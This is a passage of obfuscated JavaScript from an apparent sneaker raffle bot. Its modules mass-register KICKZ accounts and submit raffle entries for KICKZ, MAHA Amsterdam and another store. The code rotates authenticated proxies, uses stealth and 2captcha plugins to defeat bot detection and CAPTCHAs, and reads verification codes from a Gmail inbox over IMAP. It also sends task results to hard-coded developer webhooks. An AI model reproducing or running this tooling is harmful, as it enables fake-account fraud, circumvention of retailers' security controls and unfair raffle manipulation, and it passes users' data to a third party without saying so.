                            }), _0x1f6f1d = await _0x3a577c['$$eval']('select[id=\x22shoesize\x22]\x20>\x20option', _0x2db260 => {
                                return _0x2db260['map'](_0x1e2f6c => _0x1e2f6c['value']);
                            });
                            var _0x57af34 = _0x5e3d0c[_0x372d46]['Size'];
                            for (var _0x329917 = 0x1; _0x329917 < _0x1f6f1d['length']; _0x329917++) {
                                var _0x476a6e = _0x28252f[_0x329917]['split']('\x20')[0x0];
                                if (_0x476a6e == _0x57af34) {
                                    await _0x3a577c['select']('#shoesize', _0x1f6f1d[_0x329917]);
                                    break;
                                } else {
                                    if (_0x329917 + 0x1 == _0x1f6f1d['length'])
                                        throw new Error('Size\x20Not\x20Found..');
                                }
                            }
                        }
                        await _0x3a577c['waitForSelector']('#comp_address1'), await _0x3a577c['type']('#comp_address1', _0x5e3d0c[_0x372d46]['Address1'] + '\x20' + _0x5e3d0c[_0x372d46]['HouseNumber']), await _0x3a577c['waitForSelector']('#comp_address2'), await _0x3a577c['type']('#comp_address2', '' + _0x5e3d0c[_0x372d46]['Address2']), await _0x3a577c['waitForSelector']('#comp_address2'), await _0x3a577c['type']('#comp_address3', '' + _0x5e3d0c[_0x372d46]['City']), await _0x3a577c['waitForSelector']('#comp_postcode'), await _0x3a577c['type']('#comp_postcode', '' + _0x5e3d0c[_0x372d46]['Zip']), console['log'](_0x15866d() + '\x20[' + _0x37373d['name'] + ']\x20Task\x20' + (_0x372d46 + 0x1) + '\x20:\x20Sending\x20Entry'), await _0x506d6f(0x4b0), await _0x3a577c['click']('label#emailhold'), await _0x506d6f(0x5dc), await _0x3a577c['click']('#preauth_tandc_email\x20>\x20label'), await _0x506d6f(0x5dc), await _0x3a577c['click']('#submit'), await _0x3a577c['waitForSelector']('#paymentWrap'), console['log'](_0x15866d() + '\x20[' + _0x37373d['name'] + ']\x20Task\x20' + (_0x372d46 + 0x1) + '\x20:\x20' + _0x195a86['blue']('Awaiting\x20Paypal\x20Payment')), _0xb2e7c4['on']('targetcreated', async _0x3e9ab6 => {
                            if (_0x3e9ab6['type']() === 'page') {
                                const _0x5c3784 = await _0x3e9ab6['page']();
                                async function _0x169ac2() {
                                    try {
                                        await _0x3a577c['waitForSelector']('#error_message', { 'timeout': 0x493e0 }), _0x2e5373 = !![];
                                        return;
                                    } catch {
                                    }
                                }
                                async function _0x5104cc() {
                                    try {
                                        await _0x3a577c['waitForSelector']('#successMessage', { 'timeout': 0x493e0 }), _0x522666 = !![];
                                        return;
                                    } catch {
                                    }
                                }
                                _0x5104cc(), _0x169ac2(), await _0x506d6f(0x493e0);
                            }
                        });
                        async function _0x2bb3ff() {
                            for (let _0x82d53b = 0x0; _0x82d53b < 0x12c; _0x82d53b++) {
                                if (_0x522666 == !![]) {
                                    _0x12c259 = 'no', _0x37d376(_0x5e3d0c[_0x372d46], _0x37373d), console['log'](_0x195a86['green'](_0x15866d() + '\x20[' + _0x37373d['name'] + ']\x20Task\x20' + (_0x372d46 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                                    if (_0x5f2d88['webhook'] != undefined && _0x5f2d88['webhook'] != '')
                                        try {
                                            await _0x57bb0c(_0x5f2d88['webhook'], _0x442128['succesDEVMSG']);
                                        } catch {
                                        }
                                    await _0x506d6f(0xc8), await _0x57bb0c(_0x39f3e1, _0x442128['succesDEVMSG']), await _0x506d6f(0xc8);
                                    try {
                                        await _0x57bb0c(_0x3f4ede, _0x442128['succesPUBMSG']);
                                    } catch {
                                    }
                                    return;
                                } else {
                                    if (_0x2e5373)
                                        throw new Error('Paypal\x20Error:\x20Target\x20closed');
                                    else
                                        await _0x506d6f(0x3e8);
                                }
                            }
                            throw new Error('Paypal\x20Error');
                        }
                        await _0x506d6f(0xbb8), await _0x3a577c['click']('.zoid-outlet'), await _0x506d6f(0x7d0), await _0x2bb3ff();
                    } catch (_0x19346d) {
                        console['log'](_0x195a86['red'](_0x15866d() + '\x20[' + _0x37373d['name'] + ']\x20Task\x20' + (_0x372d46 + 0x1) + '\x20:\x20' + _0x19346d)), _0x6b7f72 = '' + _0x19346d;
                        var _0x121d97 = await _0x52a86e(_0x5e3d0c[_0x372d46], _0x37373d, 'dev', !![], _0x6b7f72);
                        _0x442128['errorDEV'] = { 'embeds': [_0x121d97] }, _0x5f2d88['webhook'] != undefined && _0x5f2d88['webhook'] != '' && await _0x57bb0c(_0x5f2d88['webhook'], _0x442128['errorDEV']), await _0x57bb0c(_0xb4796a, _0x442128['errorDEV']);
                    } finally {
                        _0xb2e7c4 && _0xb2e7c4['close']();
                        if (_0x12c259 == 'yes' && _0x1646b8 != 0x5 && _0x6b7f72 != 'Size\x20Not\x20Found') {
                            console['log'](_0x195a86['red'](_0x15866d() + '\x20[' + _0x37373d['name'] + ']\x20Task\x20' + (_0x372d46 + 0x1) + '\x20:\x20Retrying')), _0x372d46 = _0x372d46 - 0x1, _0x1646b8 = _0x1646b8 + 0x1;
                            continue;
                        }
                        _0x12c259 == 'yes' && _0x1646b8 >= 0x5 && (_0x5c9ba1(afew[_0x372d46], _0x37373d), _0x12c259 = 'no', _0x1646b8 = 0x0), console['log']('Waiting\x20for\x20' + _0x5f2d88['delay'] + '\x20ms'), await _0x506d6f(_0x5f2d88['delay']);
                    }
                }
            }
        }]
    },
    {
        'name': 'KICKZ',
        'modules': [
            {
                'name': 'KICKZ\x20Account\x20Generator',
                'store': 'KICKZ',
                'logo': 'https://scontent-ams2-1.cdninstagram.com/v/t51.2885-19/240479500_928777121004310_8721482303708952556_n.jpg?stp=dst-jpg_s320x320&_nc_ht=scontent-ams2-1.cdninstagram.com&_nc_cat=1&_nc_ohc=9H1DnW3bwMAAX-W7Mo2&edm=AOQ1c0wBAAAA&ccb=7-5&oh=00_AfDjR8EqgPUyl8iQgx56K_94mx_vSIRsFkQbyEq02-zAUQ&oe=63E0E147&_nc_sid=8fd12b',
                'function': async function (_0x551970, _0x373c9d, _0x5af1a9, _0x3190ad) {
                    _0x3cc012['use'](_0x28795e()), _0x3cc012['use'](_0x4cda3c({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x5f2d88['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x5d3437 = 0x0; _0x5d3437 < _0x5af1a9['length']; _0x5d3437++) {
                        if (_0x1a4844 != 'yes')
                            var _0x1a4844 = '', _0x2974ec = 0x0;
                        _0x3d4687(_0x373c9d['name'] + '\x20Task\x20' + (_0x5d3437 + 0x1) + '\x20/\x20' + _0x5af1a9['length'] + '\x20||\x20File:\x20' + _0x467f9e + '\x20Proxies:\x20' + _0x175e57), await _0x502cd4(_0x5af1a9, _0x5d3437);
                        var _0x1cc422 = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Kickz\x20Account\x20Generated',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0x3ab3dd
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0x5f2d88['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0xca8e52
                                }
                            ]
                        }];
                        const _0x2ea475 = { 'embeds': _0x1cc422 };
                        var _0x48de48 = await _0x52a86e(_0x5af1a9[_0x5d3437], _0x373c9d, 'acc', ![]);
                        const _0x50e75f = { 'succesDEVMSG': { 'embeds': [_0x48de48] } };
                        if (_0x5af1a9[_0x5d3437]['Email'] == '' || _0x5af1a9[_0x5d3437]['FirstName'] == '' || _0x5af1a9[_0x5d3437]['LastName'] == '') {
                            console['log'](_0x15866d() + '\x20[' + _0x373c9d['name'] + ']\x20Task\x20' + (_0x5d3437 + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        _0x5af1a9[_0x5d3437]['Password'] == '' && (_0x5af1a9[_0x5d3437]['Password'] = 'JRaffles23!');
                        if (_0x5f2d88['useRandomProxy'] = ![])
                            var _0x1db6df = _0x3190ad[_0x5d3437]['split'](':');
                        else
                            var _0x392759 = Math['round'](Math['random']() * (_0x3190ad['length'] - 0x1)), _0x1db6df = _0x3190ad[_0x392759]['split'](':');
                        const _0x5e9acd = await _0x3cc012['launch']({
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x1db6df[0x0] + ':' + _0x1db6df[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                        try {
                            const _0x3fd8d3 = await _0x5e9acd['newPage']();
                            await _0x3fd8d3['authenticate']({
                                'username': '' + _0x1db6df[0x2],
                                'password': '' + _0x1db6df[0x3]
                            }), console['log'](_0x15866d() + '\x20[' + _0x373c9d['name'] + ']\x20Task\x20' + (_0x5d3437 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x3fd8d3['setRequestInterception'](!![]), _0x3fd8d3['on']('request', _0x1bfad9 => {
                                _0x1bfad9['resourceType']() === 'image' || _0x1bfad9['resourceType']() === 'font' || _0x1bfad9['resourceType']() === 'media' ? _0x1bfad9['abort']() : _0x1bfad9['continue']();
                            }), await _0x3fd8d3['goto'](_0x551970), await _0x506d6f(0xbb8), console['log'](_0x15866d() + '\x20[' + _0x373c9d['name'] + ']\x20Task\x20' + (_0x5d3437 + 0x1) + '\x20:\x20Starting\x20Registration'), await _0x3fd8d3['waitForSelector']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x3fd8d3['click']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x3fd8d3['waitForSelector']('#button-register'), await _0x506d6f(0x7d0), await _0x3fd8d3['evaluate'](() => {
                                const _0x346bdd = document['querySelector']('#button-register');
                                _0x346bdd['click']();
                            }), console['log'](_0x15866d() + '\x20[' + _0x373c9d['name'] + ']\x20Task\x20' + (_0x5d3437 + 0x1) + '\x20:\x20Setting\x20Credentials'), await _0x506d6f(0x1388), await _0x3fd8d3['waitForSelector']('#customer_salutation'), await _0x3fd8d3['select']('#customer_salutation', 'mr'), await _0x506d6f(0x7d0), await _0x3fd8d3['waitForSelector']('#customer_firstname'), await _0x3fd8d3['type']('#customer_firstname', '' + _0x5af1a9[_0x5d3437]['FirstName']), await _0x506d6f(0x352), await _0x3fd8d3['waitForSelector']('#customer_lastname'), await _0x3fd8d3['type']('#customer_lastname', '' + _0x5af1a9[_0x5d3437]['LastName']), await _0x506d6f(0x352), await _0x3fd8d3['type']('#email-input', '' + _0x5af1a9[_0x5d3437]['Email']), await _0x506d6f(0x352), await _0x3fd8d3['type']('#email-confirm-input', '' + _0x5af1a9[_0x5d3437]['Email']), await _0x506d6f(0x352), await _0x3fd8d3['type']('#register-password', '' + _0x5af1a9[_0x5d3437]['Password']), await _0x506d6f(0x352), await _0x3fd8d3['type']('#password-confirm', '' + _0x5af1a9[_0x5d3437]['Password']), await _0x506d6f(0x352), console['log'](_0x15866d() + '\x20[' + _0x373c9d['name'] + ']\x20Task\x20' + (_0x5d3437 + 0x1) + '\x20:\x20Sending\x20Credentials'), await _0x3fd8d3['click']('#consent'), await _0x506d6f(0x1f4);
                            const _0x2eca34 = await _0x3fd8d3['$']('div.inputErrorMsg.b-form_section-message');
                            if (_0x2eca34) {
                                console['log'](_0x195a86['red'](_0x15866d() + '\x20[' + _0x373c9d['name'] + ']\x20Task\x20' + (_0x5d3437 + 0x1) + '\x20:\x20Your\x20password\x20must\x20contain\x20at\x20least\x20one\x20uppercase\x20&\x20one\x20lowercase\x20letter,\x20one\x20number\x20and\x20one\x20special\x20character.'));
                                continue;
                            }
                            await _0x3fd8d3['click']('#buttonRegister');
                            try {
                                await _0x3fd8d3['waitForSelector']('#verificationCode');
                            } catch {
                                throw new Error('Account\x20already\x20registered');
                            }
                            console['log'](_0x15866d() + '\x20[' + _0x373c9d['name'] + ']\x20Task\x20' + (_0x5d3437 + 0x1) + '\x20:\x20A\x20verification\x20code\x20has\x20been\x20sent\x20to\x20' + _0x5af1a9[_0x5d3437]['Email']), await _0x506d6f(0x4b0);
                            async function _0x125c36() {
                                var _0xc911e, _0x3687d3 = ![];
                                for (var _0x327496 = 0x0; _0x327496 < 0x18; _0x327496++) {
                                    async function _0x5a15f7() {
                                        var _0x47ae9f = new _0x40f5d4({
                                            'user': _0x5f2d88['masterMail'],
                                            'password': _0x5f2d88['masterPassword'],
                                            'host': 'imap.gmail.com',
                                            'port': 0x3e1,
                                            'tls': !![],
                                            'autotls': 'always'
                                        });
                                        function _0x1c8abd(_0x25d74b) {
                                            _0x47ae9f['openBox']('INBOX', ![], _0x25d74b);
                                        }
                                        _0x47ae9f['once']('ready', function () {
                                            console['log'](_0x15866d() + '\x20[' + _0x373c9d['name'] + ']\x20Task\x20' + (_0x5d3437 + 0x1) + '\x20:\x20Opened\x20Mailbox'), _0x1c8abd(function (_0x2f6673, _0x432204) {
                                                console['log'](_0x15866d() + '\x20[' + _0x373c9d['name'] + ']\x20Task\x20' + (_0x5d3437 + 0x1) + '\x20:\x20Looking\x20for\x20verification\x20mail');
                                                if (_0x2f6673)
                                                    throw _0x2f6673;
                                                _0x47ae9f['seq']['search'](['UNSEEN'], function (_0x1a10fe, _0xac85f3) {
                                                    if (!_0xac85f3 || !_0xac85f3['length'])
                                                        console['log'](_0x15866d() + '\x20[' + _0x373c9d['name'] + ']\x20No\x20mail\x20found,\x20retrying\x20in\x205\x20seconds'), _0x47ae9f['end']();
                                                    else {
                                                        var _0x446afb = _0x47ae9f['seq']['fetch'](_0xac85f3, {
                                                            'bodies': '',
                                                            'markSeen': !![]
                                                        });
                                                        _0x446afb['on']('message', function (_0x4ffff3, _0x2c2ad0) {
                                                            var _0x747a11 = '(#' + _0x2c2ad0 + ')\x20';
                                                            _0x4ffff3['on']('body', function (_0x513efa, _0xcab2) {
                                                                _0xc3daf(_0x513efa, (_0x47b2e9, _0x554863) => {
                                                                    if (_0x554863['subject'] == 'Kickz\x20Account\x20Verification\x20Code') {
                                                                        var _0x55aa37 = _0x554863['html']['split']('<div\x20style=\x22display:block;font-family:Arial,sans-serif;font-size:\x2030px;font-weight:\x20600;line-height:24px;color:#333333\x22>'), _0x3dc8eb = _0x55aa37[0x1]['split']('<')[0x0];
                                                                        _0xc911e = _0x3dc8eb;
                                                                    }
                                                                });
                                                            }), _0x4ffff3['once']('end', function () {
                                                            });
                                                        }), _0x446afb['once']('error', function (_0x5bc786) {
                                                            console['log']('No\x20mail\x20found,\x20retrying\x20in\x205\x20seconds..');
                                                        }), _0x446afb['once']('end', function () {
                                                            _0x47ae9f['end']();
                                                        });
                                                    }
                                                });
                                            });
                                        }), _0x47ae9f['once']('error', function (_0x22b78e) {
                                            console['log'](_0x195a86['red'](_0x22b78e['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox'), _0x3687d3 = !![];
                                        }), _0x47ae9f['once']('end', async function () {
                                        }), _0x47ae9f['connect']();
                                    }
                                    _0x5a15f7(), await _0x506d6f(0x1388);
                                    if (_0xc911e)
                                        return _0xc911e;
                                    if (_0x3687d3)
                                        throw new Error('Error\x20connecting\x20to\x20imap');
                                    if (_0x327496 == 0x18)
                                        throw new Error('Mail\x20not\x20found');
                                }
                            }
                            ;
                            code = await _0x125c36(), _0x506d6f(0x320), console['log'](_0x15866d() + '\x20[' + _0x373c9d['name'] + ']\x20Task\x20' + (_0x5d3437 + 0x1) + '\x20:\x20Verifying..'), await _0x3fd8d3['type']('#verificationCode', code), await _0x506d6f(0x1f4), await _0x3fd8d3['click']('#buttonVerify'), await _0x506d6f(0x190), await _0x3fd8d3['click']('#buttonVerify'), await _0x506d6f(0x3e8);
                            try {
                                await _0x3fd8d3['waitForSelector']('div.b-user_greeting'), _0x1a4844 = 'no', console['log'](_0x195a86['green'](_0x15866d() + '\x20[' + _0x373c9d['name'] + ']\x20Task\x20' + (_0x5d3437 + 0x1) + '\x20:\x20Account\x20' + _0x5af1a9[_0x5d3437]['Email'] + '\x20Generated\x20&\x20Verified!')), _0x5b0582['appendFileSync']('../accounts/kickz-verified.csv', '\x0a' + _0x5af1a9[_0x5d3437]['Email'] + ',' + _0x5af1a9[_0x5d3437]['Password'] + ','), console['log'](_0x15866d() + '\x20[' + _0x373c9d['name'] + ']\x20Task\x20' + (_0x5d3437 + 0x1) + '\x20:\x20Account\x20' + _0x5af1a9[_0x5d3437]['Email'] + '\x20Saved\x20in\x20\x27accounts/kickz-verified.csv\x27');
                                try {
                                    _0x5f2d88['webhook'] != undefined && _0x5f2d88['webhook'] != '' && await _0x57bb0c(_0x5f2d88['webhook'], _0x50e75f['succesDEVMSG']);
                                } catch {
                                }
                                await _0x57bb0c(_0x4f0ddd, _0x50e75f['succesDEVMSG']);
                            } catch {
                                _0x1a4844 = 'no', console['log'](_0x195a86['red'](_0x15866d() + '\x20[' + _0x373c9d['name'] + ']\x20Task\x20' + (_0x5d3437 + 0x1) + '\x20:\x20Verification\x20failed')), console['log'](_0x195a86['red'](_0x15866d() + '\x20[' + _0x373c9d['name'] + ']\x20Task\x20' + (_0x5d3437 + 0x1) + '\x20:\x20Account\x20saved\x20in\x20\x27accounts/kickz-unverified.csv\x27'));
                            }
                        } catch (_0x4dc9ef) {
                            console['log'](_0x195a86['red'](_0x15866d() + '\x20[' + _0x373c9d['name'] + ']\x20Task\x20' + (_0x5d3437 + 0x1) + '\x20:\x20' + _0x4dc9ef)), _0x1cc422[0x0]['title'] = 'Failed\x20kickz\x20Acc\x20Gen', _0x1cc422[0x0]['description'] = '' + _0x4dc9ef, await _0x57bb0c(_0xb4796a, _0x2ea475), _0x1a4844 = 'yes';
                        } finally {
                            _0x5e9acd && _0x5e9acd['close']();
                            if (_0x1a4844 == 'yes' && _0x2974ec != 0x5) {
                                console['log'](_0x195a86['red'](_0x15866d() + '\x20[' + _0x373c9d['name'] + ']\x20Task\x20' + (_0x5d3437 + 0x1) + '\x20:\x20Retrying')), _0x5d3437 = _0x5d3437 - 0x1, _0x2974ec = _0x2974ec + 0x1;
                                continue;
                            }
                            _0x1a4844 == 'yes' && _0x2974ec >= 0x5 && (_0x5c9ba1(_0x5af1a9[_0x5d3437], _0x373c9d), _0x1a4844 = 'no', _0x2974ec = 0x0), console['log']('Waiting\x20for\x20' + _0x5f2d88['delay'] + '\x20ms'), await _0x506d6f(_0x5f2d88['delay']);
                        }
                    }
                }
            },
            {
                'name': 'KICKZ\x20Raffle\x20Entries',
                'store': 'KICKZ',
                'logo': 'https://scontent-ams2-1.cdninstagram.com/v/t51.2885-19/240479500_928777121004310_8721482303708952556_n.jpg?stp=dst-jpg_s320x320&_nc_ht=scontent-ams2-1.cdninstagram.com&_nc_cat=1&_nc_ohc=9H1DnW3bwMAAX-W7Mo2&edm=AOQ1c0wBAAAA&ccb=7-5&oh=00_AfDjR8EqgPUyl8iQgx56K_94mx_vSIRsFkQbyEq02-zAUQ&oe=63E0E147&_nc_sid=8fd12b',
                'function': async function (_0x18c1f3, _0x6e60e6, _0x39f31c) {
                    _0x3cc012['use'](_0x28795e()), _0x3cc012['use'](_0x4cda3c({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x5f2d88['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x2b48cf = 0x0; _0x2b48cf < _0x6e60e6['length']; _0x2b48cf++) {
                        var _0x32c9d7;
                        if (_0x5a7cac != 'yes')
                            var _0x5a7cac = '', _0x29761d = 0x0;
                        _0x3d4687(_0x18c1f3['name'] + '\x20Task\x20' + (_0x2b48cf + 0x1) + '\x20/\x20' + _0x6e60e6['length'] + '\x20||\x20File:\x20' + _0x467f9e + '\x20Proxies:\x20' + _0x175e57);
                        var _0x4f34a8 = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Kickz\x20Entry',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0x3ab3dd
                                },
                                {
                                    'name': 'Product',
                                    'value': '' + _0x6e60e6[_0x2b48cf]['Url']
                                },
                                {
                                    'name': 'Size',
                                    'value': '' + _0x6e60e6[_0x2b48cf]['Size']
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0x5f2d88['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0xca8e52
                                }
                            ]
                        }], _0x3b9a89 = await _0x52a86e(_0x6e60e6[_0x2b48cf], _0x18c1f3, 'dev', ![]), _0x58a289 = await _0x52a86e(_0x6e60e6[_0x2b48cf], _0x18c1f3, 'pub', ![]);
                        const _0x429128 = {
                            'succesDEVMSG': { 'embeds': [_0x3b9a89] },
                            'succesPUBMSG': { 'embeds': [_0x58a289] }
                        };
                        await _0x502cd4(_0x6e60e6, _0x2b48cf);
                        if (_0x6e60e6[_0x2b48cf]['Email'] == '' || _0x6e60e6[_0x2b48cf]['Password'] == '' || _0x6e60e6[_0x2b48cf]['FirstName'] == '' || _0x6e60e6[_0x2b48cf]['LastName'] == '') {
                            console['log'](_0x15866d() + '\x20[' + _0x18c1f3['name'] + ']\x20Task\x20' + (_0x2b48cf + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        if (_0x5f2d88['useRandomProxy'] = ![])
                            var _0x1bc489 = _0x39f31c[_0x2b48cf]['split'](':');
                        else
                            var _0x20ffb1 = Math['round'](Math['random']() * (_0x39f31c['length'] - 0x1)), _0x1bc489 = _0x39f31c[_0x20ffb1]['split'](':');
                        const _0x23d777 = await _0x3cc012['launch']({
                            'headless': ![],
                            'args': [
                                '--proxy-server=' + _0x1bc489[0x0] + ':' + _0x1bc489[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                        try {
                            const _0x1f4593 = await _0x23d777['newPage']();
                            await _0x1f4593['authenticate']({
                                'username': '' + _0x1bc489[0x2],
                                'password': '' + _0x1bc489[0x3]
                            }), console['log'](_0x15866d() + '\x20[' + _0x18c1f3['name'] + ']\x20Task\x20' + (_0x2b48cf + 0x1) + '\x20:\x20Getting\x20Session'), await _0x1f4593['setRequestInterception'](!![]), _0x1f4593['on']('request', _0x2869f1 => {
                                _0x2869f1['resourceType']() === 'image' || _0x2869f1['resourceType']() === 'font' || _0x2869f1['resourceType']() === 'media' ? _0x2869f1['abort']() : _0x2869f1['continue']();
                            }), await _0x1f4593['goto']('' + _0x6e60e6[_0x2b48cf]['Url'], { 'waitUntil': 'networkidle2' }), await _0x506d6f(0x12c);
                            try {
                                await _0x1f4593['click']('a[title=\x22Sign\x20In\x22]');
                            } catch {
                                await _0x1f4593['click']('a[title=\x22sign\x20in\x22]');
                            }
                            console['log'](_0x15866d() + '\x20[' + _0x18c1f3['name'] + ']\x20Task\x20' + (_0x2b48cf + 0x1) + '\x20:\x20Logging\x20in'), await _0x1f4593['waitForSelector']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x1f4593['click']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x1f4593['waitForSelector']('#username'), await _0x1f4593['type']('#username', _0x6e60e6[_0x2b48cf]['Email']), await _0x1f4593['waitForSelector']('#password'), await _0x1f4593['type']('#password', _0x6e60e6[_0x2b48cf]['Password']), await _0x506d6f(0x190), await _0x1f4593['click']('#buttonSubmit'), await _0x1f4593['waitForSelector']('div.b-user_greeting'), console['log'](_0x15866d() + '\x20[' + _0x18c1f3['name'] + ']\x20Task\x20' + (_0x2b48cf + 0x1) + '\x20:\x20Getting\x20Product'), await _0x506d6f(0x1f4), await _0x1f4593['goto']('' + _0x6e60e6[_0x2b48cf]['Url'], { 'waitUntil': 'networkidle2' }), console['log'](_0x15866d() + '\x20[' + _0x18c1f3['name'] + ']\x20Task\x20' + (_0x2b48cf + 0x1) + '\x20:\x20Choosing\x20size\x20' + _0x6e60e6[_0x2b48cf]['Size']);
                            let _0x34abe4 = _0x6e60e6[_0x2b48cf]['Size']['replace']('.5', '\x201/2');
                            await _0x1f4593['click']('button[title=\x22' + _0x34abe4 + '\x22]'), await _0x506d6f(0x1f4);
                            try {
                                await _0x1f4593['click']('button[data-tau=\x22add_new_address\x22]');
                            } catch {
                            }
                            await _0x506d6f(0x12c), console['log'](_0x15866d() + '\x20[' + _0x18c1f3['name'] + ']\x20Task\x20' + (_0x2b48cf + 0x1) + '\x20:\x20Filling\x20Information'), await _0x1f4593['select']('#dwfrm_raffle_addressFields_salutation', 'mr'), await _0x506d6f(0x12c), await _0x1f4593['type']('#dwfrm_raffle_addressFields_firstName', _0x6e60e6[_0x2b48cf]['FirstName']), await _0x506d6f(0x12c), await _0x1f4593['type']('#dwfrm_raffle_addressFields_lastName', _0x6e60e6[_0x2b48cf]['LastName']), await _0x506d6f(0x12c), await _0x1f4593['select']('#dwfrm_raffle_addressFields_country', _0x6e60e6[_0x2b48cf]['Country']), await _0x506d6f(0x12c), await _0x1f4593['type']('#dwfrm_raffle_addressFields_city', _0x6e60e6[_0x2b48cf]['City']), await _0x506d6f(0x12c);
                            _0x6e60e6[_0x2b48cf]['Postcode'] == undefined && (_0x6e60e6[_0x2b48cf]['Postcode'] = _0x6e60e6[_0x2b48cf]['Zip']);
                            await _0x1f4593['type']('#dwfrm_raffle_addressFields_postalCode', _0x6e60e6[_0x2b48cf]['Postcode']), await _0x506d6f(0x12c), await _0x1f4593['type']('#dwfrm_raffle_addressFields_address1', _0x6e60e6[_0x2b48cf]['Address1']), await _0x506d6f(0x12c), await _0x1f4593['type']('#dwfrm_raffle_addressFields_address2', _0x6e60e6[_0x2b48cf]['HouseNumber']), await _0x506d6f(0x12c), await _0x1f4593['type']('#dwfrm_raffle_addressFields_additionalAddressInfo', _0x6e60e6[_0x2b48cf]['Address2']), await _0x506d6f(0x12c), await _0x1f4593['click']('#dwfrm_raffle_addressFields_saveAddress'), await _0x506d6f(0x12c), await _0x1f4593['type']('#dwfrm_raffle_raffleSpecificFields_instagramAccount', _0x6e60e6[_0x2b48cf]['Follower']), await _0x506d6f(0x1f4), await _0x1f4593['click']('#dwfrm_raffle_raffleSpecificFields_consentOnConditions'), await _0x506d6f(0x1f4), console['log'](_0x15866d() + '\x20[' + _0x18c1f3['name'] + ']\x20Task\x20' + (_0x2b48cf + 0x1) + '\x20:\x20' + _0x195a86['blue']('Awaiting\x20Paypal\x20Payment')), await _0x1f4593['click']('.b-paypal_button');
                            try {
                                await _0x1f4593['waitForSelector']('.b-raffle-message.m-success', { 'timeout': 0x493e0 }), _0x5a7cac = 'no', _0x37d376(_0x6e60e6[_0x2b48cf], _0x18c1f3), console['log'](_0x195a86['green'](_0x15866d() + '\x20[' + _0x18c1f3['name'] + ']\x20Task\x20' + (_0x2b48cf + 0x1) + '\x20:\x20Raffle\x20Entered!')), _0x5f2d88['webhook'] != undefined && _0x5f2d88['webhook'] != '' && await _0x57bb0c(_0x5f2d88['webhook'], _0x429128['succesDEVMSG']), await _0x506d6f(0xc8), await _0x57bb0c(_0x39f3e1, _0x429128['succesDEVMSG']), await _0x506d6f(0xc8), await _0x57bb0c(_0x3f4ede, _0x429128['succesPUBMSG']);
                            } catch (_0x421e82) {
                                console['log'](_0x195a86['red'](_0x15866d() + '\x20[' + _0x18c1f3['name'] + ']\x20Task\x20' + (_0x2b48cf + 0x1) + '\x20:\x20Paypal\x20Error:\x20' + _0x421e82)), _0x32c9d7 = 'Error\x20while\x20entering\x20Paypal:\x20' + _0x421e82;
                                var _0x2e06f9 = await _0x52a86e(_0x6e60e6[_0x2b48cf], _0x18c1f3, 'dev', !![], _0x32c9d7);
                                _0x429128['errorDEV'] = { 'embeds': [_0x2e06f9] }, _0x5f2d88['webhook'] != undefined && _0x5f2d88['webhook'] != '' && await _0x57bb0c(_0x5f2d88['webhook'], _0x429128['errorDEV']), await _0x57bb0c(_0xb4796a, _0x429128['errorDEV']);
                            }
                        } catch (_0xaa4aa1) {
                            console['log'](_0x195a86['red'](_0x15866d() + '\x20[' + _0x18c1f3['name'] + ']\x20Task\x20' + (_0x2b48cf + 0x1) + '\x20:\x20' + _0xaa4aa1)), _0x32c9d7 = '' + _0xaa4aa1;
                            var _0x2e06f9 = await _0x52a86e(_0x6e60e6[_0x2b48cf], _0x18c1f3, 'dev', !![], _0x32c9d7);
                            _0x429128['errorDEV'] = { 'embeds': [_0x2e06f9] }, _0x5f2d88['webhook'] != undefined && _0x5f2d88['webhook'] != '' && await _0x57bb0c(_0x5f2d88['webhook'], _0x429128['errorDEV']), await _0x57bb0c(_0xb4796a, _0x429128['errorDEV']), _0x5a7cac = 'yes';
                        } finally {
                            _0x23d777 && _0x23d777['close']();
                            if (_0x5a7cac == 'yes' && _0x29761d != 0x5) {
                                console['log'](_0x195a86['red'](_0x15866d() + '\x20[' + _0x18c1f3['name'] + ']\x20Task\x20' + (_0x2b48cf + 0x1) + '\x20:\x20Retrying')), _0x2b48cf = _0x2b48cf - 0x1, _0x29761d = _0x29761d + 0x1;
                                continue;
                            }
                            _0x5a7cac == 'yes' && _0x29761d >= 0x5 && (_0x5c9ba1(_0x6e60e6[_0x2b48cf], _0x18c1f3), _0x5a7cac = 'no', _0x29761d = 0x0), console['log']('Waiting\x20for\x20' + _0x5f2d88['AfewDelay'] + '\x20ms'), await _0x506d6f(_0x5f2d88['AfewDelay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'MAHA\x20Amsterdam',
        'modules': [
            {
                'name': 'MAHA\x20Raffle\x20Entries',
                'store': 'MAHA',
                'logo': 'https://i1.sndcdn.com/avatars-XIAMNs5LPWV2iRwj-SNwa5A-t500x500.jpg',
                'url': 'https://a.klaviyo.com/client/subscriptions/?company_id=THxSew',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'RvxrAV',
                            'custom_source': 'Air\x20Jordan\x201\x20High\x20OG\x20\x27White\x20Cement\x27',
                            'email': '',
                            'properties': {
                                '$address1': '',
                                '$city': '',
                                '$country': '',
                                '$first_name': '',
                                '$last_name': '',
                                '$zip': '',
